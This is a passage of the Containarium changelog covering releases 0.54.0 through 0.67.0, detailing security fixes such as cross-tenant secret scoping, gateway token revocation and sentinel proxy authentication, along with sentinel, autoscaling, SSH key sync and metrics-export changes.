  an enumeration failure than an empty fleet, so it is now refused without
  `--force`, the previous file is kept as `.bak`, and the write is atomic.

- **Agent-skill tokens are bounded by the dispatcher's own grant** (#1676).
  `RunAgentSkill` minted the skill manifest's `allowed_scopes` without
  intersecting them against the caller's, making `agents:run` a universal
  upgrade to any scope any installed skill declares.

- **mount-watchdog: recover a `containarium.service` left permanently dead by
  a mount-dependency failure** (#1317). A host that gates
  `containarium.service` on external/encrypted storage via
  `RequiresMountsFor=/var/lib/incus` inherits that directive's lack of retry
  semantics: a transient failure anywhere in the mount's own dependency chain
  (observed cause: a LUKS `.device` unit missing a udev "add" event) leaves
  the daemon `inactive (dead)` with zero journal entries for that boot and no
  alert. `deploy/mount-watchdog/` detects the signature (service enabled but
  inactive, mount not present), replays the incident's proven manual
  recovery (re-announce the device to udev, clear the affected units' failed
  state, restart), and logs an `ALERT` line if recovery itself fails — the
  same role `deploy/incus-watchdog/` plays for a different silent-failure
  class in `incusd`.

### Changed

- **Cross-tenant secret access now requires an explicitly granted scope.**
  Reading or writing *another* tenant's secrets needs the admin role **and**
  `secrets:read` / `secrets:write` stated on the token. The admin role alone no
  longer implies it.

  Two reasonable behaviors composed into an unintended one. `HasScope` treats an
  absent scopes claim as unrestricted — `token generate` without `--scopes` is
  documented that way — so the scope check could not deny such a token anything.
  And `AuthorizeTenant` short-circuits on the admin role, so the requested
  username was never compared against the caller. Together, a token minted
  `--roles admin` with no `--scopes` — the ordinary shape for an orchestrator,
  CI runner, or automation account — could call `GetSecret` for **any** tenant
  and receive the decrypted value. Envelope encryption does not help there: the
  daemon decrypts on demand for the caller.

  **Same-tenant access is unchanged**, including from unscoped tokens. That path
  is not the problem and is what every ordinary `containarium secrets` call
  uses, so narrowing it would break working deployments to no security end.

  **If you have automation that manages other tenants' secrets**, re-mint its
  token with `--scopes secrets:read` (or `secrets:write`, or both) alongside
  whatever else it needs. The denial names the missing scope and the flag.
  Automation that does *not* need cross-tenant secret access — most of it —
  should be left without the scope, which is the point.

  `HasScope`'s nil semantics are deliberately unchanged: flipping those globally
  would revoke every existing unscoped token across every RPC at once, a far
  larger blast radius than the one being closed.

### Fixed

- **Model-gateway tokens can now actually be revoked.** `MintToken` has always
  stamped a `jti` into every gateway token, but nothing consulted it:
  `VerifyToken` checked signature, issuer and expiry, and `handleModel` checked
  the provider and the allowed-model set. So an issued gateway token was good
  until its TTL ran out, with no kill-switch.

  That gap mattered most where the TTL is longest. A skill box's token lives 30
  minutes; a recipe box's lives a **year**, and that year was chosen on the
  stated assumption that revocation was the way to kill one early. It wasn't
  there.

  `handleModel` now checks the token's `jti` against a revocation list, after
  the provider check and before the real provider key is touched — so a revoked
  token never causes the key to be injected and never reaches the upstream. The
  daemon supplies the same jti store it already uses for platform JWTs; that
  store is issuer-agnostic, so `containarium token revoke --jti <id>` kills a
  gateway token with no new verb, RPC, or schema.

  The lookup **fails open**, matching the platform JWT path. The token's
  signature, issuer, expiry and provider binding are already checked when it
  runs, and the allowed-model ceiling is applied further down the same request,
  so a database outage degrades to exactly the protection that existed before
  this check rather than taking every tenant's model traffic down with the
  database. A daemon with no Postgres has no store to consult and logs a warning
  at startup saying its gateway tokens cannot be killed early.

## [0.67.0] - 2026-08-21

### Added

- **`connect` uses a short-lived SSH certificate when the server can sign one.**
  The MCP `connect` tool authorized a managed long-lived key on the box and
  dialed with it. That leaves a durable credential on every box an agent has
  ever touched, and those copies drift — after a host restart a box can be left
  with stale `authorized_keys` and no working login.

  Against a control plane that signs SSH certificates, `connect` now generates a
  throwaway keypair, has it signed for exactly that box, and uses a certificate
  that expires in minutes. Nothing is installed on the box, so nothing is left
  behind and nothing goes stale. The ephemeral key lives in a `0700` directory
  for the duration of the call and is removed when it returns.

  **Capability-detected, not configured.** A plain daemon has no signing
  endpoint, and a flag describing which kind of server you pointed at is a flag
  you will get wrong — so `connect` tries to issue and falls back to the managed
  key when the endpoint is absent. Existing deployments are unaffected. A server
  that *can* sign and then fails is surfaced rather than silently downgraded:
  falling back there would install a long-lived key to paper over a
  control-plane fault and never mention it.

- **Sentinel now self-checks its OWN proxy pipeline, not just the backend.**
  `healthCheckAll` only ever proved the backend was reachable. During a live
  incident the backend's health endpoint stayed up throughout a spot-instance
  restart, so the sentinel never left `PROXY` state — while its own
  ConnMux/dispatch pipeline had wedged: TCP connections were still accepted,
  but nothing downstream ever forwarded or responded, on every port (HTTPS,
  SSH). Cloudflare surfaced this as a 522 with no useful signal on which side
  was actually broken. Only a by-hand `systemctl restart` of the sentinel
  cleared it.

  A new background loop (`--self-check-failure-threshold`, default 3, 0
  disables) periodically probes the sentinel's own externally-facing HTTPS
  listener end-to-end and treats any consecutive run of unresponsive probes as
  a wedge, independent of what the backend health check reports. Past the
  threshold, the sentinel exits and lets systemd's existing `Restart=always`
  recreate it with fresh listener/dispatch state — the same fix that worked by
  hand, now automatic. Only armed in ConnMux/hybrid mode, where the incident
  occurred.

### Fixed

- **Container nodes on a nested host no longer advertise the host's capacity,
  which silently disabled autoscaling** (#1466). cadvisor derives node capacity
  from `/proc/cpuinfo` and `/proc/meminfo`, and on a nested Incus host — one
  whose own Incus creates the node containers — lxcfs masking does not reach the
  inner instance. A node limited to 2 cpu / 3GB advertised the outer host's
  8 cpu / 64GB. The scheduler packs pods against allocatable and
  cluster-autoscaler's fit simulation reads the same number, so pods were
  scheduled where they could not run and **scale-up never triggered**: no error,
  no event, just a cluster that never grew.

  The correction now depends on what the node itself reports, read from inside
  it after boot — the only vantage point that separates a nested host from a
  plain one, where lxcfs works and any reservation would exceed the node's whole
  capacity and stop kubelet starting (the failure #1456 removed). Excess over
  the requested size is reserved; no excess reserves nothing. A node whose
  `/proc` cannot be read fails the provision rather than proceeding
  uncorrected. VM nodes are untouched — they get their own kernel and report
  honestly.

  Fixed alongside it: a provision that failed *after* the instance was created
  left that instance behind, and the reconciler only recreates a **missing**
  node — so the orphan was never retried and never replaced, holding its full
  size while the cluster sat in error.

- **Scale-down is no longer undone by the reconciler, and a released node name
  can rejoin** (#1498). `DeleteNodes` destroyed the instance and lowered the
  group's target afterwards. The reconciler ticks every 15s and derives each
  group's desired minimum from that target, so a pass landing in between saw a
  group short of a target that still counted the node, and rebuilt the node the
  autoscaler had just drained.

  The rebuilt node reused the released name, which k3s refuses permanently: it
  stores a per-node password secret that outlives the Kubernetes Node object, so
  the new agent's fresh password never matched and the control plane answered
  `403 ... hash does not match` indefinitely. That node never registered —
  invisible to `kubectl`, absent from `cluster status` — while consuming its
  full size.

  The target is now lowered before anything is destroyed, node removal clears
  the k3s node-password secret, and the reconciler reads a cluster's desired
  state *after* observing the host rather than before. A removal that cannot
  clear the secret is reported as a distinct condition and recorded on the
  cluster's scale history rather than being retried or silently dropped.

- **`sync-accounts` restores every key from a container, not just the first**
  (#1477). Recovery read a container's `authorized_keys` and returned on the
  first valid line, so a box reachable by several keys — an operator key, a
  runner key, one per collaborator machine — came back authorizing exactly one,
  chosen by file order. Nothing reported the loss: the account existed, keysync
  exported it, sshpiper built a pipe, `containarium debug` reported a clean
  path, and whoever held one of the dropped keys was simply refused.

  Extraction now returns all keys in file order (de-duplicated), and the sync
  seeds the account with the first then authorizes the rest — the same
  seed-then-authorize-the-rest shape the create and collaborator paths already
  used. `containarium recover` had the identical truncation and is fixed with
  it. Per-account output now prints the key count, so a three-key box coming
  back with one is visible at the point of repair rather than at someone's next
  login; an account created whose extra keys could not all be authorized is
  reported as a distinct `Partial` outcome rather than being hidden in
  `Restored` or escalated to `Failed`.

- **`containarium debug` no longer recommends a flag that does not exist**
  (#1478). Its missing-host-user remediation printed
  `sync-accounts --user <name>`, but `sync-accounts` registered only
  `--dry-run` and `--force`, so the suggested command failed with
  `unknown flag: --user` — read by someone already locked out, following it
  literally, and inviting the conclusion that the diagnosis was wrong when only
  the remedy was mistyped.

  `--user` now exists and scopes the sweep to one container; without it the
  command still sweeps every container on the host, which the flag help now
  says out loud. `--user` naming a container that does not exist is an error
  rather than a silent "0 restored". The remediation list is also reordered to
  put the non-destructive repair first — it previously led with
  `delete && create`, i.e. destroy the box, for a fault where the container and
  its data are intact — and the destructive option is now labelled as such. A
  test asserts every command `debug` prints resolves and parses against the
  real cobra command tree, since these strings live in a different package from
  the flags they name. **That test immediately found two more
  broken hints of the same kind**, both of which would have failed the same way
  in front of a locked-out operator:

  - `containarium create <user> --ssh-keys <pubkey>` — the flag is `--ssh-key`
    and takes a path, not inline key material. Printed in two places.
  - `containarium start <user>` — no such top-level command; `start` is
    app-scoped (`containarium app start <app>`). The container verb is `wake`.

- **Sentinel `MemoryHigh` no longer sits below `MemoryMax` by default** (#1454,
  correcting #1350). A soft cap under the hard cap only helps if reclaim can
  make progress, and progress needs page cache or swap. The sentinel hosts have
  no swap and the #1349 burst is anonymous memory, so file cache is exhausted
  within minutes and reclaim has nothing left to evict: the cgroup parks between
  the two limits and is throttled indefinitely. It never reaches the cap, so
  `Restart=always` never fires and systemd keeps reporting `active (running)`
  while the process serves nothing.

  Measured on a production sentinel: `memory.events` `high=556267` with
  `oom_kill=0`, PSI `full avg300=86.10`, and `pgsteal`/`pgscan` of 3% — about 90
  minutes of total edge outage, ended by hand, where the OOM-and-restart path it
  replaced recovered in seconds. It surfaced as `Permission denied (publickey)`
  on every SSH attempt, because the stalled process could not open an upstream
  and sshpiper re-prompted until clients ran out of keys.

  `MemoryHigh` now defaults to `MemoryMax`, so there is no window to stall in;
  reclaim still runs at the threshold and the `high` counter still serves as an
  early signal. `containarium sentinel service install` refuses a `--memory-high`
  below `--memory-max` unless the host actually has swap, and reads an
  unreadable `/proc/meminfo` as "no swap" so an unverifiable host still gets the
  safe configuration.

- **Sentinel no longer tears down a backend's own reconnect (#769).** After a
  backend host reboots — a routine event when it runs on preemptible capacity
  — it reconnects its tunnel under the same spot id. `TunnelRegistry.Register`
  closes the previous yamux session in order to replace the entry, and that
  close woke the goroutine monitoring the OLD session, which then ran its
  ordinary disconnect cleanup against the registration that had just replaced
  it: proxy listeners closed, loopback alias removed, the spot unregistered,
  and `OnDisconnect` fired, which strips that backend's users out of the
  sshpiper config. The tunnel was up and healthy; nothing routed over it. SSH
  to that host's containers stayed broken until an operator restarted the
  sentinel by hand.

  Each registration now carries a generation, and every teardown step is
  conditional on that generation still being the current one — checked under
  the same lock as the mutation it guards, so a superseded watcher cannot race
  a fresh registration. A genuine disconnect is unaffected and still cleans up
  fully. A reconnect now re-keys on its own (keysync applies immediately on
  connect), so the manual `systemctl restart` workaround is no longer needed.

### Added

- **Live host load per backend in `list_backends` / `GET /v1/backends`** —
  `BackendInfo` gains a `host_load` block: 1/5/15-minute CPU load averages
  with the host's core count as the denominator, memory used vs total, disk
  used vs total, and the sample timestamp. Covers the local daemon and every
  healthy tunnel-connected peer, so BYOC hosts — which previously had no
  load signal anywhere in the product — report load like any other backend.
  Surfaced in `containarium backends list` / `backends get` (new CPU LOAD /
  MEM / DISK columns) and in the `list_backends` MCP tool.

  No new measurement or transport: `GetSystemInfo` already carried these
  figures and `ListBackends` already fetched it for the local backend and
  forwarded it to each peer — the projection into `BackendInfo` was the
  missing step, which is why capacity and committed sums were visible while
  actual load was not. This rides the peer fan-out rather than the
  per-container driver path, so it is independent of BYOC container-metrics
  work.

  `host_load` is **null, never zeroed**, when no usable sample exists (probe
  failed, peer unreachable). A host we could not measure must not render as
  an idle one — that indistinguishability is what made placement decisions
  blind. Used-byte figures are clamped to `[0, total]` because used and
  available come from separate probes and a skewed read could otherwise
  surface a negative "bytes in use".

## [0.66.0] - 2026-08-14

Scope is everything merged to `main` since v0.65.0 (2026-08-08): 97 commits,
no breaking changes.

Note: the `[Unreleased]` section above predates v0.62.0 and was not moved into
the v0.62.0-v0.65.0 releases when those were tagged. It is left untouched here
rather than being folded into this release, which would misattribute already
shipped work. See the tracking issue for reconstructing those four sections.

### Added

- **Per-tenant ZFS native encryption for container storage** (#1199). Dataset
  operations (#1230), pre-start / post-stop hooks (#1232), snapshot and
  rollback accounting under encryption (#1244, #1258), an explicit storage pool
  threaded through the create path (#1339, #1345), `EnsureTenantStorage`
  replacing the pre-create hook (#1346), and `--encrypted` now actually
  encrypting rather than being accepted and ignored (#1347, #1294).
  `--zfs-keys-dir` configures key custody (#1342). Verified against a real ZFS
  pool in CI, including that one tenant's key cannot open another tenant's data
  (#1241, #1242, #1243).

- **Tenant egress allowlists on the Kubernetes backend** (#1188). A tenant ACL
  compiles to a NetworkPolicy on top of the default-deny floor, refusing what
  it cannot express rather than silently narrowing it (#1260, #1261), with a
  reconciler wired into the daemon (#1263, #1264) and enforcement proven in the
  e2e lane under Calico (#1235, #1265, #1273).

- **Tenant secrets materialized into the box** (#1190) — delivered to the
  backend the box actually runs on (#1276), mounted into K8s boxes (#1274), and
  used to build the agent-box session environment (#1275).

- **SSH session audit on the Kubernetes backend** (#1189). Dropbear login lines
  are parsed into audit sessions (#1267) behind a backend-neutral session
  source (#1268, #1270, #1271).

- **Sentinel self-diagnostics** — an admin-gated `/debug/pprof/*` endpoint plus
  a `containarium sentinel pprof` CLI (#1352), and process-health series
  (`process_resident_memory_bytes`, `go_goroutines`, `process_open_fds`) on
  `/metrics` (#1351). Both exist because a ~18 MB/day leak (#1349) ran for 27
  days undetected and was OOM-killed before anything could profile it.

- **Durable agent and crew state** (#1182) — a crew-run store (#1316) and agent
  task queue (#1318) behind interfaces, with runs stranded RUNNING by a restart
  reconciled on startup (#1324).

- **Runner provisioning at organization scope**, and targeting a backend or
  pool (#1254, #1255). **Configurable incus storage pool** (#1252).

### Fixed

- **The tamper-evident audit chain never verified, and forked under load**
  (#1326).
- **Sentinel memory is now bounded by its unit** (#1350) — `MemoryHigh=35%` /
  `MemoryMax=50%` / `OOMPolicy=stop`, so a leak restarts one process instead of
  stalling the host. Daemon units get `MemoryAccounting=yes` and deliberately
  no cap.
- **Go 1.26.5 -> 1.26.6** (#1354), clearing 7 reachable standard-library
  vulnerabilities that were failing govulncheck on every pull request.
- Sentinel: re-assert the loopback alias when a spot reconnects (#1256),
  fast-retry a failed key/cert sync rather than waiting a full interval
  (#1236), verify the tunnel handshake before reporting a successful pool join
  (#1246), and bound the systemd restart rate while still retrying forever
  (#1233).
- `ContainerDataset` named a dataset that does not exist (#1335). Postgres run
  stores were never actually constructed (#1320). A crew run is now recorded
  while in flight and cloned in the store (#1298). The K8s network-policy
  reconciler stops on shutdown (#1302). Peers forward the whole create request
  rather than a hand-copied subset (#1249). The layer4 app is rebuilt after
  Caddy reverts to its stub (#1245). An alert severity that routes nowhere is
  rejected (#1304). The gateway emits the `stack` field the web UI already
  reads (#1323).

### Changed

- **Strong typing over magic strings** — a typed backup engine enum (#1157,
  #1303), a `SecretDelivery` enum (#1229), typed SSE payloads (#1310), a typed
  container list (#1309), and a real context on `FetchPeerPKI` (#1308).
- OpenTelemetry bumped to 1.45.0 / 0.70.0 (#1299); buf plugins pinned to
  v2.30.0 (#1297).

### Internal

- Stores are now exercised against a real Postgres rather than skipping
  unconditionally (#1300, #1322, #1325, #1327-#1331), an Incus-exercisable lane
  covers the daemon's `Create()` path (#1334), CI gates every PR rather than
  only those targeting `main` (#1237), and lint now covers code behind build
  tags (#1313). Sentinel tests no longer require `CAP_NET_ADMIN`, mutate the
  host, or bind ports the machine may already be using (#1278, #1279, #1301,
  #1306, #1307). Concrete backend hostnames anonymized in test fixtures
  (#1239).

## [0.61.0] - 2026-07-27

### Added

- **Cloud metrics export now covers the platform domain, not just the
  host.** v0.60.0 shipped the export toggle and the host series; this
  round adds the groups that make an exported dashboard answer
  operational questions rather than just "is the box alive":
  a **heartbeat** series with a dead-man alert recipe, so the failure
  class where the host or daemon simply dies is caught by metric
  *absence* rather than going unnoticed (#1090); **API health** —
  requests and errors bucketed by `code_class` via grpc-gateway's own
  status mapping (#1092); **provisioning outcomes** — attempts,
  failures and duration keyed by `create`/`delete` (#1094);
  **connectivity** — healthy peer count plus each peer's tunnel
  up/down state, which is how a BYOC peer gets represented at all
  given it cannot export for itself (#1095); and **per-container**
  CPU/memory/disk/network series, the last unimplemented piece of the
  export design (#1098).

- **`containarium cloud enroll --adopt-foreign`** — acknowledges, in
  one explicit flag, that the host being enrolled already runs
  cloud-managed containers belonging to another organization. The
  control-plane half refuses such a host by default; this is the
  operator's deliberate override. Note the flag must be in operators'
  hands *before* the control-plane guard is deployed, since the guard
  fails closed and this is the only way past it (#1104).

- **`containarium doctor` now reports host security posture**, as its own
  advisory section alongside the existing capability checks. For BYOC the
  machine is the customer's, from an image we did not build, so "can this
  host run workloads" and "is it safe to run them here" are different
  questions — and until now only the first was ever asked. The new group
  covers data-volume encryption (dm-crypt), Secure Boot, auditd, sshd
  hardening (`PermitRootLogin` / `PasswordAuthentication`), unattended
  security upgrades, and whether the cloud metadata endpoint is reachable
  from the host. The daemon reports them to the control plane through the
  existing status probe, so a control plane records posture per host with
  no contract change.

  Two properties worth knowing. **A check that cannot gather evidence
  reports unmet, never a pass** — the point is to distinguish what we can
  attest from what we cannot, and a check that passed on no evidence would
  manufacture the assurance it is supposed to establish. So an ordinary
  unhardened host will show several unmet items, including ones that may
  well be fine (provider-managed disk encryption, for instance, is
  invisible from inside the guest and is reported as unobservable rather
  than absent). **Nothing here blocks anything**: posture checks are
  advisory, `doctor`'s exit code is unchanged, and the daemon's
  `self_check_ok` is still derived from the capability checks alone (#1106).

### Fixed

- **A resumed metrics export no longer re-emits under a placeholder
  identity.** A daemon that resumed export on restart published its
  host series as `backend_id="local", region=""` instead of its real
  identity, splitting the host across two `backend_id` streams and
  silently dropping it from any dashboard or alert keyed on
  `backend_id` — the failure was invisible precisely where it
  mattered. Export now waits until identity is wired (#1087).

- **A box is now SSH-reachable as soon as it reports RUNNING** — the
  sentinel learned about a box's SSH key only by polling each backend's
  `/authorized-keys` on a 2-minute ticker, so a box created just after a
  tick was RUNNING while sshpiper had no pipe for it and SSH answered
  `Permission denied (publickey)` for up to two minutes (~50s typical).
  Anything that trusted RUNNING as "ready" — CI, agents, the documented
  create→ssh flow — failed its first connection attempts. The daemon now
  calls a new HMAC-gated `POST /sentinel/keys/resync` whenever its
  host-side key set changes (container create/delete, `AddSSHKey`,
  `RemoveSSHKey`), and the sentinel re-pulls that backend's keys and
  rewrites the sshpiper routing table immediately. Concurrent resyncs for
  one backend coalesce on "a pull that started after this request
  arrived", which is guaranteed to include the caller's key — never a
  time-based skip, which is what would reintroduce the bug. The periodic
  sync is unchanged and remains the convergence backstop, so a lost or
  refused notification costs the old latency rather than reachability.
  Revoked keys likewise stop routing at revocation instead of up to two
  minutes later (#1100).

### Documentation

- Cloud-native metrics export: PRD for application-domain metrics
  (#1086), the platform-domain metric-group design (#1088), the
  committed GCM dashboard's platform group plus quickstart (#1096),
  the BYOC no-export posture with a corrected heartbeat claim (#1097),
  and a bare-VM quickstart carrying a real measured cost estimate
  (#1099).

### Security

- **The sentinel's peer proxy now requires authentication.**
  `/peer/<backend-id>/*` on the sentinel's binary-server port forwards to
  that backend's daemon, and was the only route on that mux registered
  with no middleware while every neighbouring `/sentinel/*` route was
  HMAC-gated. The backend-id namespace on a sentinel is flat and global,
  so anything able to reach that port could address every tunnel-joined
  backend the sentinel fronts, across all organizations — enumerating
  them and probing whatever each daemon exposes pre-auth. The daemon's
  own authentication still stood behind it, so this was a
  lateral-movement surface rather than an open door, but it is the layer
  meant to stop the probing. It is now gated by the sentinel **admin**
  secret, the same authority secret `/sentinel/tunnel-tokens` and
  `/sentinel/byoc-routes` already use. Rejections are also uniform now:
  an unknown backend id and a malformed path return a byte-identical 404
  that no longer echoes the requested id back, so an authorized caller
  cannot map a sentinel's backends by diffing error responses.

  **Operator action required before upgrading.** A sentinel with no
  `CONTAINARIUM_SENTINEL_ADMIN_SECRET` set now rejects every `/peer/`
  request with 401 — fail-closed, since a fail-open fallback would skip
  the fix precisely on the hosts whose operator never configured the
  secret. If a control plane drives tunnel-joined backends through this
  sentinel, set that secret **and** make sure the caller signs its
  `/peer/` requests before rolling this out; otherwise those backends
  become undrivable. The sentinel logs this loudly at startup when the
  secret is absent (#1105).


## [0.60.0] - 2026-07-23

### Added

- **Cloud-native metrics export (opt-in): toggle, provider enum, and
  credential probe** (#1069, PR #1075). New
  `containarium monitoring export enable|disable|status` CLI (with
  matching gRPC/REST endpoints and MCP tool) controlling opt-in export
  of host infra metrics to the host cloud's native monitoring. GCP is
  the MVP provider (typed `CloudMetricsProvider` enum, AWS reserved).
  Enabling synchronously probes Application Default Credentials with
  the monitoring-write scope and fails closed with a remediation hint —
  nothing is enabled or exported on a host without usable credentials.
  Disabled by default, reversible any time, no daemon restart required.
- **Host-level series now actually export to GCP Cloud Monitoring**
  (#1070, PR #1076). A dedicated OTel pipeline (separate from the
  daemon's internal VictoriaMetrics collector) pushes eight allowlisted
  host gauges — `containarium.host.cpu.load_1m/_5m/_15m`,
  `.memory.used_bytes/.total_bytes`, `.disk.used_bytes/.total_bytes`,
  and `.container.count` — every 60s as `workload.googleapis.com/*`
  series on the `gce_instance` monitored resource. Labels are
  restricted to `backend_id`/`hostname`/`region`; structurally no
  org/tenant identifiers. Export state persists in `daemon_config` and
  resumes automatically after a daemon restart (startup-ordering bug
  caught and fixed during live validation on a GCP backend).
  `monitoring export status` reports real health: last success time,
  last error, and failure count. Keeps host load visible and alertable
  from the provider's monitoring even when the host-local metrics
  stack is degraded.

### Internal

- Dependency bumps: `google.golang.org/grpc` 1.82.1 (#1046),
  `google.golang.org/api` 0.289.0 (#1048), `sigs.k8s.io/agent-sandbox`
  0.5.2 (#1047), `actions/setup-go` v7 (#1044), `actions/setup-python`
  v7 (#1045), `actions/setup-node` v7 (#1043).

## [0.59.2] - 2026-07-22

### Fixed

- **BYOC ingress listen-array fix (#733 follow-up), corrected.** v0.59.1's
  fix used a scoped `PUT .../listen`, which Caddy's admin API rejects with
  `409 key already exists` once that key already holds a value — so the
  listener was never actually added on any host past its first-ever
  provision. Caught live deploying v0.59.1 to a lab BYOC host. Switched to
  the same `getFullConfig`/`loadConfig` atomic-swap round trip already
  used elsewhere in this file (`EnableProxyProtocol`); every existing
  route survives untouched.

## [0.59.1] - 2026-07-22

### Fixed

- **BYOC ingress listener now actually appears on an already-provisioned
  host** (#733 follow-up). `EnsureServerConfig` treated an existing Caddy
  server config as fully done and never checked whether its listen array
  matched the configured set — a host that set
  `CONTAINARIUM_BYOC_INGRESS_ADDR` after its edge was already provisioned
  would restart, log that the ingress listener was enabled, and Caddy
  would silently keep listening on only `:80`/`:443`. Caught live during
  the #733 slice-4 rollout. Fixed with a scoped reconcile that adds only
  the missing listen entries without touching existing routes.
- **SSH host-key checking in `transfer.go` upgraded from
  insecure-ignore to accept-new`** (#1061); `go.mod` bumped to Go
  1.26.5.

## [0.59.0] - 2026-07-20

### Fixed

- **Internal peer service token now renews instead of expiring after 30
  days.** The daemon-to-peer admin token (used for peer metrics and the
  #1029 capacity-ranking probe) was minted once for the 30-day maximum
  and held forever; a daemon running longer than a month then silently
  `401`'d every internal peer call — the same silent-credential-death
  shape as the BYOC driver-token expiry (#903). A shared renewing token
  source now re-mints ahead of expiry, which also shrinks a leaked
  internal token's useful life from a month to an hour.

### Added

- **Opt-in capacity-aware pool placement** (#1029). When a pool create
  has no explicit backend, `--placement-cpu-aware` routes it to the
  least CPU-committed healthy peer (committed cores / physical cores)
  instead of an arbitrary first-healthy one, spreading load before the
  admission gate has to refuse it. The daemon caches each peer's
  commitment on the existing 30s discovery cadence (no per-create
  round-trip); peers whose capacity isn't known yet fall back to
  first-healthy. Off by default; the local-backend preference is
  unchanged. Env `CONTAINARIUM_PLACEMENT_CPU_AWARE`; see
  `docs/CPU-CAPACITY-ADMISSION.md`.
- **Opt-in CPU capacity admission** (#1029). A daemon can now refuse a
  container create that would push its host's committed cores past
  `physical_cores × --cpu-overcommit-factor`, closing the gap where a
  host could accept far more committed CPU than it physically has and
  let one tenant starve its co-located neighbours. Off by default
  (`factor = 0`); `--cpu-overcommit-enforce` gates whether an enabled
  check rejects (gRPC `ResourceExhausted`) or is advisory (logs what it
  would reject, for observe-first rollout). The gate is per-host and
  composes with pools — a peer-routed create is admitted by the target
  peer's own daemon — excludes core-infra and the tenant being
  recreated, and fails open if host capacity can't be read. Env
  fallbacks `CONTAINARIUM_CPU_OVERCOMMIT_FACTOR` /
  `CONTAINARIUM_CPU_OVERCOMMIT_ENFORCE`; see `docs/CPU-CAPACITY-ADMISSION.md`.

## [0.58.0] - 2026-07-20

### Fixed

- **A delete racing an in-flight async create no longer manufactures a
  fake "Async creation failed"** (#1035). Provisioning runs for minutes,
  so a delete frequently lands mid-run and pulls the instance out from
  under the creating goroutine; the resulting `Instance not found` was
  logged as a creation failure, indistinguishable in the journal from a
  genuine one. (During one incident investigation this manufactured at
  least eight false "confirmations" of an already-fixed bug.) The delete
  now claims the pending creation, which logs a single unambiguous
  cancellation line, drops out of the `CREATING`/`PROVISIONING` state
  Get/List report, and reaps the box if the creation happened to finish
  after its own delete. Genuine failures still surface as `ERROR`.
- **Delete-cascade tolerates a live SSH session when removing the host
  user** (#1035). `userdel: user X is currently used by process N` left
  an orphaned account until the reaper's next tick; the box is already
  gone at that point, so the remaining session is terminated and
  `userdel` retried once. Every other `userdel` failure is unchanged.
- **CPU limits are now a hard CFS quota, not a soft scheduler share**
  (#1034, completing #1029). `limits.cpu.allowance` was emitted as a
  percentage (`400%`), which Incus applies only under contention — the
  cgroup's `cpu.max` stayed `max`, so a single container still burst to
  the whole host whenever its neighbours were idle. Containarium now
  emits the time-slice form (`400ms/100ms`), the documented hard-quota
  syntax, giving a request the bounded entitlement the platform bills
  and schedules against and matching Kubernetes millicpu semantics.
  Existing containers keep their percentage allowance until resized;
  reading a CPU request back understands both forms.

## [0.57.0] - 2026-07-20

### Added

- **Weekly base-image re-bake timer** (#1037, closes its remaining
  scope). `scripts/containarium-rebake.{service,timer}` re-run
  `image-bake` every Sunday (with jitter and downtime catch-up) so baked
  base images keep receiving distro security updates; `docs/IMAGE-BAKE.md`
  covers baking, the fast-path opt-out, timer install, and staleness
  checks. A failed re-bake is safe: the image alias only moves on a
  successful publish.

### Fixed

- **BYOC driver-token auto-refresh no longer silently disabled by a
  legacy cloud config** (cloud#888/#903). The #557 refresh loop only
  armed when `cloud.yaml` named a `jwt_secret_file` — a field
  pre-#557 enrollments never wrote and daemon upgrades never backfilled,
  so legacy-enrolled hosts' cloud-stored driver tokens silently expired
  at the 30-day cap and every cloud→host operation failed 401. An empty
  field now falls back to the default daemon secret path when readable;
  `cloud enroll --no-driver-token` writes a durable
  `driver_token_disabled` marker so the explicit opt-out survives; and
  a daemon that can refresh from neither path logs a loud warning naming
  the 30-day consequence.

## [0.56.0] - 2026-07-20

### Added

- **Baked base images — creates drop from ~3 minutes to roughly
  clone + boot** (#1037, first slice). `containarium image-bake` runs the
  exact per-create provisioning (package repos, podman, service
  enablement) once into a local image under a deterministic alias;
  stackless creates whose source image + podman setting match the bake's
  recorded properties clone the baked image and skip the in-container
  package install — also removing mid-create exposure to distro/repo
  mirror outages. Opt-in by running `image-bake` on the host; no baked
  image means the previous behavior, byte-identical. Re-bake on a
  schedule to pick up security updates (the alias is re-pointed and the
  replaced image reaped).

### Fixed

- **List responses are honest about provisioning** (#1036). A box
  mid-provisioning (packages and SSH keys still installing) reported raw
  incus `RUNNING` in list responses minutes before SSH could work,
  inviting clients to connect too early — and cleanup deletes after
  those failed attempts aborted creates that were still in progress.
  `ListContainers` now reports `CREATING`/`PROVISIONING` from the same
  pending-creation state `GetContainer` already used (including
  synthetic entries for creates not yet visible in incus, with the
  state filter applied to the reported state). `containarium create
  --wait [--wait-timeout]` adds blocking ergonomics on top of the
  still-async create, and the MCP create response now says explicitly
  that provisioning takes minutes and to poll `get_container` until
  `RUNNING` before SSH.

## [0.55.1] - 2026-07-19

### Fixed

- **Whole-core CPU requests are now actually throttled** (#1030). Every
  whole-number `limits.cpu` request (`1`..`8`) previously set only the
  cpuset (which cores are visible) with no CFS-bandwidth cap on how much
  CPU time those cores may consume — only fractional requests (`0.25`,
  `250m`) got a real throttle. Since every cloud size-tier bundle resolves
  to a whole-core count, the overwhelming majority of tenant containers
  had no enforced CPU ceiling at all, letting one noisy tenant starve
  every other co-located tenant regardless of nominal tier.
- **Auto-placement no longer picks a backend it would itself report
  unhealthy** (#1031). `resolvePoolPlacement` picked the local backend
  unconditionally when a create's pool matched the daemon's local pool,
  with no health check — while the peer-candidate branch two lines below
  has always required a healthy peer. A bounded (3s), fail-closed
  liveness probe now gates both call sites; an unhealthy local backend
  falls through to a healthy peer instead of being chosen blindly.

## [0.55.0] - 2026-07-18

### Added

- **BYOC public HTTP ingress — host listener** (#733, slice 3 of 3; opt-in,
  inert by default). The host daemon's edge Caddy can serve one extra
  loopback-only **plaintext** listener that Host-routes the same routes as
  `:443` without TLS — the endpoint the sentinel plaintext-forwards to over the
  tunnel in the sentinel-terminate model, so the host needs no cert. Enabled
  only when `CONTAINARIUM_BYOC_INGRESS_ADDR` is set (conventional
  `127.0.0.1:8081`); empty (default) leaves region hosts and existing
  deployments byte-identical. End-to-end BYOC public ingress also needs its
  cloud counterpart and live validation, so the path is not yet active on a
  fresh deploy.

### Fixed

- **Fractional-CPU limits are enforced again** (#1022). The incus driver now
  sets `limits.cpu` alongside `limits.cpu.allowance`, so a sub-core CPU request
  (e.g. `0.5`) is actually capped rather than silently ignored.

## [0.54.0] - 2026-07-18

### Added

- **BYOC public HTTP ingress — sentinel side** (#733, slice 1 of 3). The
  sentinel can now serve a tenant subdomain for a box on a tunnel-joined BYOC
  host: on a cloud-pushed `subdomain → host` binding it terminates TLS with the
  `*` wildcard cert it already syncs and plaintext-forwards the request to the
